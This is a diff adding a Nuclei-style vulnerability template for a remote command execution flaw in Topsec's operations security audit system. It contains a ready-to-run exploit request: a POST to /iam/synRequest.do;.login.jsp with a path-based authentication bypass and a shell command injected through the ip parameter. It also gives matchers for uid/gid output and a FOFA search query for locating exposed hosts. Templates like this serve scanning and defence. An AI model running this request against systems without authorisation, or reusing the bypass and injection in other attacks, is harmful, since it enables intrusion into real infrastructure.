@@ -1,0 +1,42 @@
+id: topsec-topSAG-synRequest-rce
+
+info:
+  name: 天融信运维安全审计系统synRequest存在远程命令执行漏洞
+  author: hancool
+  severity: critical
+  description: 天融信运维安全审计系统synRequest存在远程命令执行漏洞
+  reference:
+    - https://github.com/wjlin0/poc-doc/blob/b73e91d938eac0551aeaeddc985465e3af44f02c/docs/wy876_poc/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9FsynRequest%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata: 
+    verified: true
+    fofa-query: 'header="iam" && server="Apache-Coyote/" && cert="fort.simp.com"'
+  tags: topsec,topSAG
+
+http:
+  - raw:
+      - |+
+        POST /iam/synRequest.do;.login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 59
+
+        method=trace_route&w=1&ip=127.0.0.1|echo%20`id`%3b&m=10
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        part: body
+        words:
+          - "uid="
+
+      - type: word
+        part: body
+        words:
+          - "gid="
